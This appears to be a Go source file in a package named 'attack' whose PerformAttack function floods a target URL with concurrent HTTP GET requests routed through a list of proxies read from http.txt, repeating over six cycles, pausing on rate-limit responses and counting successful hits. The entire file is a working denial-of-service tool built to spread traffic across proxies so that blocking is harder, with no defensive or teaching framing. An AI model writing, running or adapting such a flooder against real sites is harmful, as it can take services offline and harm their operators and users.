package attack

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

func readFile(path string) []string {
	file, err := os.Open(path)
	if err != nil {
		fmt.Println(err)
		return nil
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

var operation int = 0

func fetchWithProxy(wg *sync.WaitGroup, proxy string, URL string) int {
	defer wg.Done()

	proxyURL, err := url.Parse(proxy)
	if err != nil {
		fmt.Println("Error: ", err)
		return 0
	}

	transport := &http.Transport{
		Proxy:             http.ProxyURL(proxyURL),
		DisableKeepAlives: false,
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	response, err := client.Get(URL)
	operation++
	fmt.Printf("%d. ", operation)
	if err != nil {
		fmt.Println(err)
		return 0
	} else if response.StatusCode == 429 {
		time.Sleep(5 * time.Second)
		return 0
	} else {
		fmt.Println("Response Status:", response.Status)
		return 1
	}
}

func PerformAttack(URL string) {
	listOfProxies := readFile("http.txt")
	if listOfProxies == nil {
		return
	}
	numberCycles := 6
	var numberResponse int
	for cycle := 0; cycle < numberCycles; cycle++ {
		var wg sync.WaitGroup
		proxyChan := make(chan string, len(listOfProxies))

		for i := 0; i < len(listOfProxies); i++ {
			go func() {
				for proxy := range proxyChan {
					result := fetchWithProxy(&wg, proxy, URL)

					numberResponse += result

				}
			}()
		}

		for _, proxy := range listOfProxies {
			wg.Add(1)
			proxyChan <- proxy
		}

		close(proxyChan)
		wg.Wait()
	}
	fmt.Println("Number of OK responses:", numberResponse)
}
